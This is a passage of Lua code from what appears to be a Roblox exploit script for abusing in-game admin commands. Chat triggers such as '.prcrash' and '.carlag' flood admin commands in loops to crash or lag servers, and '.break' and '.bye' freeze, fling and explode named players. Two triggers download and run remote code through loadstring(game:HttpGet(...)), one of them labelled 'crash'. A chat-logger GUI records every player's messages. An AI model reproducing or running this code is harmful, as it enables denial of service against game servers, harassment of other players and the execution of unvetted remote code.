            game.Players:Chat("m PR SCRIPT")
          wait(1)
          for i = 1,128 do
          game.Players:Chat("dog all all all fuck")
          game.Players:Chat("clone all all all fuck")
          game.Players:Chat("rocket/all/all/all fuck")
          game.Players:Chat("shield/all/all/all fuck")
          game.Players:Chat("freeze all all all")
          game.Players:Chat("size all .3")
          end
          end
          end)

plr.Chatted:Connect(function(prcrash)
          if string.sub(prcrash, 1) == ".prcrash" then
          game.Players:Chat("char all 1389780396")
          wait(1)
          for i = 1,128 do
          game.Players:Chat("dog all all all fuck")
          game.Players:Chat("clone all all all fuck")
          game.Players:Chat("rocket/all/all/all fuck")
          game.Players:Chat("shield/all/all/all fuck")
          game.Players:Chat("freeze all all all")
          game.Players:Chat("size all .3")
          end
          end
          end)

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.sub(msg, 0, 5) == ".chat" then 
        local text = string.sub(msg, 7)
        game.Players:Chat("h                                                                                                                                                                                     "..text.."                                                                                                                                                                      laughing out loud") 
        end
end)

plr.Chatted:Connect(function(ahcrash)
          if string.sub(ahcrash, 1) == ".soundcrash" then
          game.Players:Chat("char all 1389780396")
          game.Players:Chat("music 00000000000000000000000000000000006865649264")
          wait(1)
          for i = 1,128 do
          game.Players:Chat("dog all all all fuck")
          game.Players:Chat("clone all all all fuck")
          game.Players:Chat("rocket/all/all/all fuck")
          game.Players:Chat("shield/all/all/all fuck")
          game.Players:Chat("freeze all all all")
          game.Players:Chat("size all .3")
          end
          end
          end)

plr.Chatted:Connect(function(silcrash)
          if string.sub(silcrash, 1) == ("bye xd") then
     for i = 1,50 do
      game.Players:Chat("h/BY ATPROG (PR SCRIPT)")
      game.Players:Chat("m/IMAGINE GETTING CRASHED BY ATPROG (PR SCRIPT)")
      end
  
      game.Players:Chat("crashedez")
      end
      end)
     
     plr.Chatted:Connect(function(carlag)
    if string.sub(carlag, 1) == (".carlag") then 
game.Players:Chat(".spam gear all 253519495")
wait(30)
game.Players:Chat(".unspam")
wait(1)
game.Players:Chat("reset all")
end
end)
     
    plr.Chatted:Connect(function(crashedez)
    if string.sub(crashedez, 1) == ("crashedez") then 
loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/deneme/main/crash"))()
end
end)
  
  plr.Chatted:Connect(function(movereg)
 if string.sub(movereg, 1) == ".moveregen" then
RegenMover()
end
end)
  
 plr.Chatted:Connect(function(findreg)
 if string.sub(findreg, 1) == ".findregen" then
loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/deneme/main/findregen"))()
end
end)

plr.Chatted:Connect(function(lyrics)
if string.sub(lyrics, 1) == ".lyrics" then
local folder = workspace.Terrain._Game.Folder
game.Players:Chat("clr")
repeat task.wait() until not folder:FindFirstChild("Sound")        
game.Players:Chat("time -")
game.Players:Chat("fogcolor 0 0 0")
game.Players:Chat("fogend 500")
game.Players:Chat("music 1840006904")
repeat task.wait() until folder:FindFirstChild("Sound") and folder:FindFirstChild("Sound").Playing
local sound = folder:FindFirstChild("Sound")
task.spawn(function() 
if sound.TimePosition == 0 then repeat task.wait() until not sound.TimePosition == 0 end
if sound.TimePosition ~= 0 then repeat task.wait() until not sound.TimePosition == 0 end
game.Players:Chat("fix");
game.Players:Chat("clr");
end)
wait(7.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\nI had a friend");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHe was all so lovely");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHe listens so wellll and pays so much attention to me");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHe listens so wellll and pays so much attention to me");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nI tell him bout who I loooooooooooooove                                                                                                            ");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                                                            He gives me advisive stuff");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAnd whenever it was rough           ");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n           He keeps me back into touch");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n One day he");wait(1)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                            tooooooooold");wait(1)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                         me");wait(1.2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSowwy            ");wait(1)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                  but           ");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                               he           ");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                            just           ");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                            had           ");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                                enough           ");wait(1)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHe said he looooooooooooooved                                                                                                            ");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHe said he looooooooooooooved                                                                                                            ")
game.Players:Chat("h/ Hello there everyone\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nme                                                ");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                                                            That's when I told him");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbaby stop");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbaby stop                                                                                                            ");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                                                            baby stop");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbaby stop                                                                                                            ");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                                                            ohhhhhhhhhhh");wait(1.5)
game.Players:Chat("disco") -- drop
wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.7)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n I don't wanna break your");wait(1.5)
game.Players:Chat("h/ No not really\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                    haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawaaaaaaaaaaaat");wait(2)
game.Players:Chat("h/ What are you talking about?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbut");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n I think we're better as");wait(1.5)
game.Players:Chat("h/ You kidding, bro?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                    freeeeeeeeeeeeeeeeeeeeeeheeeeeeeeeeeeeeeeeeeeeeeeeeeeendddddsssssssss");wait(2.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n I don't wanna break your");wait(1.5)
game.Players:Chat("h/ No not really\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                    haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawaaaaaaaaaaaat");wait(2)
game.Players:Chat("h/ What are you talking about?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbut");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n I think we're better as");wait(1.5)
game.Players:Chat("h/ You kidding, bro?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                    freeeeeeeeeeeeeeeeeeeeeeheeeeeeeeeeeeeeeeeeeeeeeeeeeeendddddsssssssss");wait(2.5)
game.Players:Chat("fix") -- drop end
game.Players:Chat("time -")
game.Players:Chat("fogcolor 0 0 0")
game.Players:Chat("fogend 500")
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\nIt could get tricky");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\nIt could get tricky");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDon't wanna get tricky");wait(2)
game.Players:Chat("h/ My character fell into a pit\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nStickyickyicky");wait(1.5)
game.Players:Chat("disco the drop again") -- drop
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\nIt could get tricky");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\nThis could get tricky");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nIt could get tricky");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nStickyickyicky yoooo");wait(1.5) -- plus .5 added since the second drop goes earlier
--[[
game.Players:Chat("disco the drop again") -- drop
wait(.5)]]
game.Players:Chat("fogend 190")
game.Players:Chat("h/ The song is nice\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ It's fye\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.7)
game.Players:Chat("h/ more then fya\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n I don't wanna break your");wait(1.5)
game.Players:Chat("h/ No not really\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                    haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawaaaaaaaaaaaat");wait(2)
game.Players:Chat("h/ What are you talking about?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbut");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n I think we're better as");wait(1.5)
game.Players:Chat("h/ You kidding, bro?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                    freeeeeeeeeeeeeeeeeeeeeeheeeeeeeeeeeeeeeeeeeeeeeeeeeeendddddsssssssss");wait(2.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n I don't wanna break your");wait(1.5)
game.Players:Chat("h/ No not really\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                    haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawaaaaaaaaaaaat");wait(2)
game.Players:Chat("h/ What are you talking about?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbut");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\noooooooooowooooooooooooowoooooooooooowooooooooooowoooooooooo");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n I think we're better as");wait(1.5)
game.Players:Chat("h/ You kidding, bro?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                    freeeeeeeeeeeeeeeeeeeeeeheeeeeeeeeeeeeeeeeeeeeeeeeeeeendddddsssssssss");wait(2.5)
game.Players:Chat("fix") -- drop end
game.Players:Chat("time -")
game.Players:Chat("fogcolor 0 0 0")
game.Players:Chat("fogend 500")
wait(1)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n One day he");wait(1)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                            tooooooooold");wait(1)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                         me");wait(1.2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSowwy            ");wait(1)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                  but           ");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                               he           ");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                            just           ");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                            had           ");wait(.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                                enough           ");wait(1)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHe said he looooooooooooooved                                                                                                            ");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHe said he looooooooooooooved                                                                                                            ")
game.Players:Chat("h/ Hello there everyone\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nme                                                ");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                                               That's when I told him baby stop");wait(3)
game.Players:Chat("disco the drop AGAIN") -- drop
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\nIt could get tricky");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\nIt could get tricky");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDon't wanna get tricky");wait(2)
game.Players:Chat("h/ My character fell into a pit\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nStickyickyicky");wait(1.5)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\nIt could get tricky");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\nThis could get tricky");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nIt could get tricky");wait(2)
game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nStickyickyicky yoooo")
wait(5)
over = true
end
end)
 
  plr.Chatted:connect(function(message)
  if string.sub(message, 1, 7) == (".break ") then
  local victim = string.sub(message, 8)
            
                game.Players:Chat("freeze " .. victim)
                for i = 1, 100 do
                    game.Players:Chat("dog " .. victim)
                end
                wait(.4)
                for i = 1, 100 do
                    game.Players:Chat("dog " .. victim)
                end
                wait(.1)
                game.Players:Chat("goldify " .. victim)
                wait(.2)
                game.Players:Chat("thaw " .. victim)
                wait(.2)
                game.Players:Chat("explode " .. victim)
              
            end
        end)
  
      plr.Chatted:Connect(function(upa)
          if string.sub(upa, 1) == (".upa") then

      game.Players:Chat("unpunish all")
      game.Players:Chat("h Succesfully Unpunished All")

      end
      end)
      
  player.Chatted:Connect(function(message)
    if string.sub(message, 1, 5) == ".bye " then
      local name = string.sub(message, 6)
      game.Players:Chat("speed " .. name .. " 0")
      game.Players:Chat("fling " .. name)
      
    end
end)

      plr.Chatted:Connect(function(atprog)
          if string.sub(atprog, 1, 8) == (".atprog ") then
    local name = string.sub(atprog, 9)
      game.Players:Chat("char " .. name .. " 1389780396")

      end
      end)

plr.Chatted:Connect(function(menaal)
          if string.sub(menaal, 1, 8) == (".menaal ") then
          local name = string.sub(menaal, 8)
      game.Players:Chat("char " .. name .. " 1793973864")
      end
      end)
      
      
plr.Chatted:Connect(function(agspureiam)
      if string.sub(agspureiam, 1, 12) == "agspureiam " then
      local name = string.sub(agspureiam, 13)
     game.Players:Chat("char " .. name .. " 36377783")
      end
      end)
  
plr.Chatted:Connect(function(tech)
          if string.sub(tech, 1, 6) == (".tech ") then
local name = string.sub(tech, 7)
      game.Players:Chat("char " .. name .. " 1702851506")

      end
      end)
      
      plr.Chatted:Connect(function(aria)
          if string.sub(aria, 1, 6) == (".aria ") then
          local name = string.sub(aria, 7)

      game.Players:Chat("char " .. name .. " 2781438808")
      
      end
      end)
      
      plr.Chatted:Connect(function(mel)
          if string.sub(mel, 1, 5) == (".mel ") then
          local name = string.sub(mel, 6)

      game.Players:Chat("char " .. name .. " 619659263")
      
      end
      end)

      plr.Chatted:Connect(function(dies)
      if string.sub(dies, 1) == ("reset") then
      game.Players:Chat("h im bored so ill reset y'all.")
      game.Players:Chat("reset others")

      end
      end)


addCommand("logs",{},function()
    spawn(function()
        -- Gui to Lua
-- Version: 3.2

-- Instances:

local chatlogger = Instance.new("ScreenGui")
local Main = Instance.new("ImageLabel")
local uic1 = Instance.new("UICorner")
local scroll = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local template = Instance.new("ImageButton")
local UICorner_2 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

chatlogger.Name = "chatlogger"
chatlogger.IgnoreGuiInset = true
chatlogger.ResetOnSpawn = false
chatlogger.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
chatlogger.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = chatlogger
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.LayoutOrder = 1
Main.Position = UDim2.new(0.0278281905, 0, 0.0933544338, 0)
Main.Size = UDim2.new(0, 296, 0, 429)
Main.Image = "rbxassetid://11400472392"
Main.Draggable = true
Main.ScaleType = Enum.ScaleType.Crop

spawn(function()
    local UserInputService = game:GetService("UserInputService")

local gui = Main

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		if gui.Visible then
			update(input)
		end
	end
end)
end)

uic1.CornerRadius = UDim.new(0, 16)
uic1.Name = "uic1"
uic1.Parent = Main

scroll.Name = "scroll"
scroll.Parent = Main
scroll.Active = true
scroll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scroll.BackgroundTransparency = 1.000
scroll.BorderSizePixel = 0
scroll.LayoutOrder = 1
scroll.Position = UDim2.new(0,0,0,20)
scroll.Size = UDim2.new(1, 0, 1, -20)
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)

UIListLayout.Parent = scroll
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

ImageButton.Parent = Main
ImageButton.AnchorPoint = Vector2.new(1, 0)
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.Position = UDim2.new(1, 0, 0, 0)
ImageButton.Size = UDim2.new(0, 20, 0, 20)
ImageButton.Image = "rbxassetid://11400472392"

UICorner.Parent = ImageButton

TextLabel.Parent = ImageButton
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(1, 0, 1, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "X"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 24.000
TextLabel.TextStrokeTransparency = 0.000

template.Name = "template"
template.Parent = chatlogger
template.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
template.BackgroundTransparency = 1.000
template.BorderSizePixel = 0
template.Size = UDim2.new(1, 0, 0, 15)
template.Visible = false
template.Image = "rbxassetid://11400472392"
template.ScaleType = Enum.ScaleType.Tile
template.TileSize = UDim2.new(0.330000013, 0, 1, 0)

UICorner_2.Parent = template

TextLabel_2.Parent = template
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Size = UDim2.new(1, 0, 1, 0)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "[Username]: deez nuts"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextStrokeTransparency = 0.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

-- Scripts:

local function SGVLNS_fake_script() -- Main.LocalScript 
	local script = Instance.new('LocalScript', Main)

	local ui = script.Parent.Parent
	local scroll = ui.Main.scroll
	local template = ui.template
	
	local numericalthing = 0
	
	local logger = game.Players.PlayerChatted:Connect(function(nobodycares,player,message)
		local temp = template:Clone()
		temp.Parent = scroll
		temp.Visible = true
		temp.TextLabel.Text = "["..player.Name.."]: "..message
		temp.LayoutOrder = numericalthing
		temp.MouseButton1Click:Connect(function()
		    setclipboard(temp.Textlabel.Text)
		end)
		numericalthing=numericalthing-1
	end)
	
	ui.Main.ImageButton.MouseButton1Click:Connect(function()
		logger:Disconnect()
		ui:Destroy()
	end)
end
coroutine.wrap(SGVLNS_fake_script)()
    end)
end)

addCommand("hiddenlogs",{},function()
    runCommand(prefix.."logs",{})
end)


addCommand("draggablelogs",{},function()
	Loops.draggablelogs = true
	repeat wait()
		for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
			if v.Name == "ScrollGui" and not v:FindFirstChild("Fixed") then
				Instance.new("StringValue",v).Name = "Fixed"
								
				spawn(function()
				    local UserInputService = game:GetService("UserInputService")
					
					local gui = v.TextButton
					
					local dragging
					local dragInput
					local dragStart
					local startPos
					
					local function update(input)
						local delta = input.Position - dragStart
						gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
					end
					
					gui.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
							dragging = true
							dragStart = input.Position
							startPos = gui.Position
							
							input.Changed:Connect(function()
								if input.UserInputState == Enum.UserInputState.End then
									dragging = false
								end
							end)
						end
					end)
					
					gui.InputChanged:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
							dragInput = input
						end
					end)
					
					UserInputService.InputChanged:Connect(function(input)
						if input == dragInput and dragging then
							if gui.Visible then
								update(input)
							end
						end
					end)
				end)
			end
		end
	until not Loops.draggablelogs
end)

addCommand("undraggablelogs",{},function()
	Loops.draggablelogs = false
end)

addCommand("gui",{},function()
